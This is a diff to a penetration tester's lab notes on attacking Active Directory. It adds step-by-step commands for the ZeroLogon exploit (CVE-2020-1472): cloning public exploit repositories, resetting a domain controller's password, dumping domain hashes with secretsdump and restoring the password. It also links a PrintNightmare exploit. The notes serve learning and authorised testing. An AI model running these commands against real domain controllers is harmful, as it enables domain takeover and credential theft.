@@ -439,10 +439,71 @@ Let's save `SID` and `NTLM` hashes of `krbtgt`.
 
 ![metasploitPsexec4](../assets/img/AD2/Screenshot%202024-08-01%20at%2012.12.01.png)
 
+![metasploitPsexec5](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.10.05.png)
+
+![metasploitPsexec6](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.03.png)
+
+![metasploitPsexec7](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.10.png)
+
+![metasploitPsexec8](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.20.png)
+
+![metasploitPsexec9](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.31.png)
+
+![metasploitPsexec10](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.53.png)
+
+![metasploitPsexec11](../assets/img/AD2/Screenshot%202024-08-01%20at%2023.09.45.png)
+
 With this golden ticket, I can revise domain users' password or set up backdoor.
 
 ## Additional Active Directory Attacks
 
-## AD Case Studies (interesting strategies)
+Active Directory vulnerabilities occur all the time. Recent major vulnerabilities include zeroLogon, PrintNightmare, sam the admin.
+
+It is worth checking for these additional vulnerabilities, **but I should not attempt to exploit them unless my client approves**. I need to get approvals before attempting these exploitations.
+
+- ZeroLogon
+
+It is a really critical bug. This attack allows the account password to be reset. As a result of this attack, I can obtain the `NTDS.DIT` dumping without knowing the password of the Domain Controller (DC).
+
+https://github.com/SecuraBV/CVE-2020-1472 - for checking if the target machine is vulnerable to this attack
+
+https://github.com/dirkjanm/CVE-2020-1472 - for exploitation and restore the password
+
+As this attack is extremely dangerous, I need to consider the potential impact on the network if a DC goes down, what the consequences would be if clients are unable to restore the DC to a working state, and finally, whether demonstrating the exploit is worth the risk.
+
+1. `git clone https://github.com/dirkjanm/CVE-2020-1472.git`
+   `git clone https://github.com/SecuraBV/CVE-2020-1472.git`
+
+It will be great to save the folder in `/opt`.
+
+2. Run `python3 zerologon_tester.py HYDRA-DC 192.168.64.32`
+
+If DC can be compromised by a zerologon attack through this checking.
+
+Then exploit.
+
+3. `python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.64.32`
+
+4. `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.64.32`
+
+Hashes will be dumped.
+
+Try to restore.
+
+5. `impacket-secretsdump administrator@192.168.64.32 -hashes $(dumped hashes)`
+
+The hash formate will be like `a:a`.
+
+And then copy the `$(plain_password_hex)`
+
+6. `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.64.32 -hexpass $(plain_password_hex)`
+
+This command is to change the password.
+
+- PrintNightmare
+
+This vulnerability does not require authentication to exploit. It takes advantage of the print spooler service. It allows users to add printers and perform other actions, running with system privileges.
+
+https://github.com/cube0x0/CVE-2021-1675
 
 ## Attacking Active Directory: Post Exploitation
